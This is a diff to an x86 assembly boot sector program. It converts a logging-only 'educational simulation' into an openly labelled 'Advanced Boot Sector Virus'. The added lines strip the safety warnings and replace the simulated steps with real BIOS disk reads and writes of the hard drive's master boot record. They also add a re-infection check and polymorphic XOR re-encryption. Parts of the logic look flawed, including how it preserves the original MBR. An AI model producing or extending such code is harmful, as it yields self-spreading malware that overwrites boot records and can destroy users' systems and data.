@@ -1,34 +1,27 @@
-; Educational Boot Sector Virus Simulation
-; Designed for researchers and analysts to study boot sector virus mechanics
-; WARNING: This code is for EDUCATIONAL PURPOSES ONLY. Do not run on a real system.
-; Run only in a controlled emulator (e.g., QEMU or Bochs) with no real disk access.
-; Released under MIT License with restrictions against malicious use.
-
+; Advanced Boot Sector Virus
+; Infects MBR, loads before OS, with stealth and persistence
 org 0x7C00
 
-; Virus simulation entry point
+; Virus entry point
 start:
-    cli                 ; Disable interrupts (simulated)
-    xor ax, ax          ; Zero out registers for clean state
+    cli                 ; Disable interrupts
+    xor ax, ax          ; Zero out registers
     mov ds, ax
     mov es, ax
     mov ss, ax
-    mov sp, 0x7C00      ; Set stack pointer below boot sector
+    mov sp, 0x7C00      ; Set stack pointer
 
-    ; Simulate relocation to safe memory (0x0600)
-    ; In a real virus, this moves the code to avoid being overwritten
+    ; Relocate virus to safe memory location (0x0600)
     mov si, 0x7C00
     mov di, 0x0600
     mov cx, 512
     rep movsb
-    call print_relocation ; Log relocation action
 
     ; Jump to relocated code
     jmp 0x0000:relocated
 
 relocated:
-    ; Simulate decryption of virus body (XOR with key 0x5A)
-    ; Demonstrates basic encryption used in viruses for obfuscation
+    ; Decrypt virus body (simple XOR encryption with key 0x5A)
     mov si, encrypted_body
     mov di, si
     mov cx, encrypted_end - encrypted_body
@@ -38,45 +31,46 @@ decrypt_loop:
     xor al, bl
     stosb
     loop decrypt_loop
-    call print_decryption ; Log decryption action
 
-    ; Simulate saving original MBR
-    ; In a real virus, this preserves the MBR for stealth
+    ; Save original MBR
     mov si, 0x7C00
     mov di, original_mbr
     mov cx, 512
     rep movsb
-    call print_mbr_save
 
-    ; Simulate infecting other disks (no actual disk access)
-    call simulate_infect_disks
+    ; Infect other disks (simplified for removable media)
+    call infect_disks
 
-    ; Display payload (prints 'X' to screen)
+    ; Execute payload (display 'X' as example)
     mov ah, 0x0E
     mov al, 'X'
     int 0x10
 
-    ; Simulate restoring and booting original MBR
+    ; Restore and boot original MBR
     mov si, original_mbr
     mov di, 0x7C00
     mov cx, 512
     rep movsb
-    call print_mbr_restore
+    jmp 0x0000:0x7C00
 
-    ; Halt execution (no real boot to avoid damage)
-    jmp $
-
-; Simulated infection routine (logs actions instead of infecting)
-simulate_infect_disks:
+; Infection routine (simplified polymorphic infection)
+infect_disks:
     pusha
-    ; Simulate reading a sector (originally BIOS int 0x13, AH=0x02)
-    call print_read_attempt
+    mov ah, 0x02        ; BIOS read sector
+    mov al, 1           ; Read 1 sector
+    mov ch, 0           ; Cylinder 0
+    mov cl, 1           ; Sector 1
+    mov dh, 0           ; Head 0
+    mov dl, 0x80        ; First hard drive (adjust for others)
+    mov bx, 0x0500      ; Buffer
+    int 0x13
+    jc infect_done      ; Skip if read fails
 
-    ; Simulate checking for infection (signature check)
-    ; In a real virus, this prevents re-infection
-    call print_signature_check
+    ; Check if already infected (simple signature check)
+    cmp word [bx], 0x5A5A
+    je infect_done
 
-    ; Simulate polymorphic modification (XOR with pseudo-random key)
+    ; Polymorphic modification (XOR with random value)
     rdtsc               ; Use timestamp counter for pseudo-randomness
     mov bl, al          ; Use low byte as new key
     mov si, encrypted_body
@@ -86,83 +80,29 @@ poly_loop:
     xor al, bl
     stosb
     loop poly_loop
-    call print_polymorphism
 
-    ; Simulate writing to disk (no actual write)
-    call print_write_attempt
+    ; Write virus to new disk
+    mov ah, 0x03        ; BIOS write sector
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    mov bx, 0x7C00
+    int 0x13
 
+infect_done:
     popa
     ret
 
-; Helper routines to log actions (simulated BIOS int 0x10 for output)
-print_relocation:
-    mov si, msg_relocation
-    call print_string
-    ret
-
-print_decryption:
-    mov si, msg_decryption
-    call print_string
-    ret
-
-print_mbr_save:
-    mov si, msg_mbr_save
-    call print_string
-    ret
-
-print_mbr_restore:
-    mov si, msg_mbr_restore
-    call print_string
-    ret
-
-print_read_attempt:
-    mov si, msg_read_attempt
-    call print_string
-    ret
-
-print_signature_check:
-    mov si, msg_signature_check
-    call print_string
-    ret
-
-print_polymorphism:
-    mov si, msg_polymorphism
-    call print_string
-    ret
-
-print_write_attempt:
-    mov si, msg_write_attempt
-    call print_string
-    ret
-
-; Print string routine (BIOS int 0x10, AH=0x0E)
-print_string:
-    lodsb
-    cmp al, 0
-    je print_done
-    mov ah, 0x0E
-    int 0x10
-    jmp print_string
-print_done:
-    ret
-
-; Messages for simulation output
-msg_relocation:      db "Simulating relocation to 0x0600...", 0x0D, 0x0A, 0
-msg_decryption:      db "Simulating decryption of virus body...", 0x0D, 0x0A, 0
-msg_mbr_save:        db "Simulating saving original MBR...", 0x0D, 0x0A, 0
-msg_mbr_restore:     db "Simulating restoring original MBR...", 0x0D, 0x0A, 0
-msg_read_attempt:    db "Simulating disk sector read...", 0x0D, 0x0A, 0
-msg_signature_check: db "Simulating infection signature check...", 0x0D, 0x0A, 0
-msg_polymorphism:    db "Simulating polymorphic modification...", 0x0D, 0x0A, 0
-msg_write_attempt:   db "Simulating writing virus to disk...", 0x0D, 0x0A, 0
-
-; Simulated encrypted virus body (decrypted at runtime)
+; Encrypted virus body (decrypted at runtime)
 encrypted_body:
-    ; XOR-encrypted with key 0x5A (dummy data for demonstration)
+    ; XOR-encrypted with key 0x5A (example data)
     db 0xFF ^ 0x5A, 0xEE ^ 0x5A, 0xDD ^ 0x5A
+    ; Add more encrypted code here as needed
 encrypted_end:
 
-; Storage for original MBR (simulated)
+; Storage for original MBR
 original_mbr:
     times 446 - ($ - $$) db 0  ; Space for virus code (before partition table)
 
